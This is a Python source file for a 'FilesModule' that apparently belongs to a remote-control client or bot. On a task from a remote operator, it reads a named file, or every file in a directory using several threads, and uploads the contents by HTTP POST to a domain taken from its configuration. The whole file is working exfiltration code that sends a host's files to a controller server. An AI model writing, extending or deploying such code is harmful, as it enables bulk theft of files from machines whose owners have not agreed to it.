import os
from requestMethods.requestMethods import *
from helpers.helpers import *
from config.config import config
import threading

import requests

class FilesModule:

	def __init__(self, stateInstance):
		self.name = 'files'
		self.stateInstance = stateInstance


	def run(self, clientId, task):
		print('Files module is running...')

		if task['type'] == 'downloadfiles':
			self.downloadFiles(clientId, task) 


	def downloadFiles(self, clientId, task):
		self.sendFiles(clientId, task)


	def sendFile(self, clientId, taskId, filePath):
		fileName = os.path.basename(filePath)

		_data = [
			('type', 'downloadfile-request'),
			('task_id', taskId),
			('client_id', clientId)
		]

		if not os.path.isfile(filePath):
			_data.append(('no_file', 'no_file'))
			_response = requests.post(config['domains'][0], data=_data)
			return False

		_file = {
			'file': (fileName, open(filePath, 'rb'))
		}

		_response = requests.post(config['domains'][0], data=_data, files=_file)

		print(_response.text)


	def sendFilesFromDownloadFilesTask(self, _queue, clientId, taskId):
		while not _queue.empty():

			filePath = _queue.get()
			fileName = os.path.basename(filePath)


			self.sendFile(clientId, taskId, filePath)



	def sendFiles(self, clientId, task):
		if 'is_dir' in task:

			dirPath = task['path']

			fullPaths = []

			for path in os.listdir(dirPath):
				full_path = os.path.join(dirPath, path)
				if os.path.isfile(full_path):
					fullPaths.append(full_path)

			_queue = makeQueue(fullPaths)

			for i in range(int(task['threads'])):
				t = threading.Thread(target=self.sendFilesFromDownloadFilesTask, args=(_queue,clientId,task['task_id'],))
				t.start()

		else:
			self.sendFile(clientId, task['task_id'], task['path'])





